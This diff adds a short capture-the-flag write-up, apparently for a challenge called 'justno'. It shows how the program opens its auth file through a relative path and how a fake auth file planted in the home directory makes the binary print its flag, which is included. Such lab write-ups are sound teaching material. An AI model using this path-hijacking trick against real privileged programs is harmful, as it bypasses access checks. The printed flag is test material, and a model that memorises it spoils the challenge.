@@ -1,0 +1,16 @@
+Looking at the source of the program, we find that it uses relative paths
+to access the auth file.
+
+    FILE* authf = fopen("../../problems/fcf3cfa90b13f6ed463d61aa9b4da4ce/auth","r"); //access auth file in ../../../problems/fcf3cfa90b13f6ed463d61aa9b4da4ce
+
+In other words, goes up two directories, then goes back into the problem folder to find auth.
+We can exploit this to use our own auth file by running the program somewhere else and creating
+a good auth file. If we make a folder called problems/fcf3cfa90b13f6ed463d61aa9b4da4ce in our
+home directory, we can place an auth file within and get our flag when calling the binary.
+
+james9909@shell-web:/problems/fcf3cfa90b13f6ed463d61aa9b4da4ce$ cd ~
+james9909@shell-web:~$ mkdir -p problems/fcf3cfa90b13f6ed463d61aa9b4da4ce
+james9909@shell-web:~$ cd problems/fcf3cfa90b13f6ed463d61aa9b4da4ce/
+james9909@shell-web:~/problems/fcf3cfa90b13f6ed463d61aa9b4da4ce$ echo "yes" > auth
+james9909@shell-web:~/problems/fcf3cfa90b13f6ed463d61aa9b4da4ce$ /problems/fcf3cfa90b13f6ed463d61aa9b4da4ce/justno
+Oh. Well the auth file doesn't say no anymore so... Here's the flag: 23ef992262f66c836ca999a82c17e0e3
